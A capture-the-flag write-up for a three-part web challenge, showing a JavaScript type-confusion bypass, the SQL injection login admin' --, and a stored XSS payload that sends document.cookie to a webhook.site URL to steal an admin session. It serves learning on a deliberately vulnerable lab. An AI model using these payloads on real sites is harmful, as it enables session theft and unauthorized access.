# Intro to Web 3
Alright. We've looked at what happens on your browser and also what happens in the communication between your browser and our web server. But what actually happens on our web server? What even is a web server?

## Solution
Full flag: CSCG{Q8oIoy3Ps956UwvvWIfJAzNs}

### Part 1 (JavaScript exploiting)
The website takes an input between 50 and 100, calculates a random number and hashes the flag with the amount of the lower number of the two.

The website code show no exploitation. Taking a look at the source code server side, we can see that there are restrictions for the input. It has to be not undefindet, no string and if its a number not lower than 50. But this isnt checking for ohter JSON data types:
```js
const crypto = require("crypto");
let flag = require("./flag");

function randomHashing(request, response) {

    // take the user's number and make sure they actually sent us a positive number
    const chosenNumber = request.body["chosenNumber"];
    if (chosenNumber === undefined || typeof chosenNumber === "string") {
        response.status(400).send("You must choose a number!");
        return;
    }
    if (typeof chosenNumber === "number" && chosenNumber < 50) {
        response.status(400).send("Hey, no cheating!");
        return;
    }

    // now pick our own random number and take whichever one is lower
    const randomNumber = Math.floor(Math.random() * 100 + 1);
    const iterations = Math.min(chosenNumber, randomNumber);

    // sha256 the flag that often
    let hashedFlag = flag;
    for (let i = 0; i < iterations; i++) {
        hashedFlag = crypto.createHash("sha256").update(hashedFlag).digest('hex');
    }

    response.send(`Here's the first part of your flag, sha256'd ${iterations} times: ${hashedFlag}`);
}

module.exports = randomHashing;
```

The Math.min function doesnt check for numbers as inputs. So in zap we can rewrite the request and send the following payload: `{"chosenNumber":false}`. With that the JavaScript code takes a '0' as minimum and does not hash the flag at all.

As response we get the unhashed part of the flag: _Here's the first part of your flag, sha256'd 0 times: CSCG{Q8oIoy3P_

### Part 2 (SQLi)
From the description we know that SQL injection is the way to go. Also we know that there should be some kind of admin user. So trying the following SQL statement as login:
```
admin' --
```

Inspecting the given code from the server this will create the following SQL call querry:
```
SELECT username,is_admin from users WHERE username='admin' --' AND password='password';
```

We close the querry with the apostrophe and commenting the rest of the command out with the double dashes. So the command is basically search for the values of the admin user, doesnt matter what the password is.

And so is our result:
```
Login
Logged in as: admin
Here's your flag part 2/3: s956Uwvv 
```

### Part 3 (XSS)
Good to know: _Modern browsers sandbox almost everything. The JavaScript interpreter in one browser tab usually can't access anything that isn't strictly part of that tab. So you can't just read someone's hard drive files or their saved secrets from another site._

Checking if the website is vulnerable can be done with the following statement: `<script>alert("test");</script>`. If we put this inside a guest book entry and refresh the site, we will get a pop up alert notification with the content 'test'.

The description says that there is a cookie from the admin, that the need to authenticate. Accessing a cookie in JavaScript can be done by the following:
```js
let cookie = document.cookie;
```

But with this command the cookie is no where we can access to it. For accessing it we can use websites like https://requestbin.io or https://webhook.site. Here we can create a http endpoints, which logs every http request, that reaches it. So if we add the cookie from the variable to the request an send it, the site will log it. This can be done with the following code:
```js
<script>
let cookie = document.cookie;
window.location.replace("https://webhook.site/fefa0848-9057-468c-8b64-312d24be0879/" + cookie);
</script>
```

After a few seconds we get our admin cookie on Webhook: https://webhook.site/fefa0848-9057-468c-8b64-312d24be0879/session-id=d82bbb0739fc1493b5625186b6e5faa7bfb6da35b485c468a13d703b432db500

In zap we can now manipulation the request for the website and replace our cookie with the admin cookie. As response we get the last part of the flag:
```html
[...]
<li>[2023-03-22 17:15:39.672641] @admin: Hello, welcome to my guestbook!</li></ul>

<h3>Secret Flag Info</h3>
<hr>
Here's your flag part 3/3: WIfJAzNs}
</body>
</html>
```

Alternative we can recreate our session, so that the guestbook is empty again. Now we can manipulate our session cookie with a cookie editor and paste the admin cookie.
